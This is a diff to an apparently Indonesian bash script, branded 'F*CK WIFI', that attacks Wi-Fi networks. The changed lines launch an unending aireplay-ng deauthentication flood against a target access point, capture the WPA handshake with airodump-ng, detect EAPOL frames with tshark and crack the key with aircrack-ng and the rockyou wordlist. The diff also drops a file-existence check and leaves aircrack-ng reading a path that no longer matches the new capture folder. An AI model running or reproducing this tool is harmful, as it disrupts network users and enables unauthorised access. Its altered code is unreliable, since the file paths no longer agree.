@@ -57,7 +57,6 @@ if ! [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
     echo "Format BSSID tidak valid. Harap masukkan BSSID dalam format XX:XX:XX:XX:XX:XX."
     exit 1
 fi
-
 read -p "Masukkan nomor Channel: " channel
 if [[ -z "$channel" ]]; then
     echo "Channel tidak boleh kosong."
@@ -70,16 +69,14 @@ fi
 iwconfig "$interface" channel "$channel"
 timestamp=$(date +"%Y-%m-%d_%H:%M:%S")
 output_file="${bssid}_${timestamp}"
-xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface"
-file_pcap="$output_file-01.cap"
-if [ ! -f "$file_pcap" ]; then
-    echo "File pcap '$file_pcap' tidak ditemukan."
-    exit 1
-fi
-echo ""
+xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w file_pcap/$output_file $interface"
+file_pcap="file_pcap/$output_file-01.cap"
 handshakes=$(tshark -r "$file_pcap" -Y "eapol" -T fields -e wlan.bssid -e wlan.da -e wlan.sa -e eapol.keydes.type -E occurrence=f | wc -l)
 if [[ $handshakes -gt 0 ]]; then
     aircrack-ng -w "wordlists/rockyou.txt" "$output_file-01.cap"
+    echo ""
+    echo "[F*CK WIFI] 'Semoga harimu menyenangkan' [F*CK WIFI]"
+    echo ""
     exit 0
 else
     echo ""
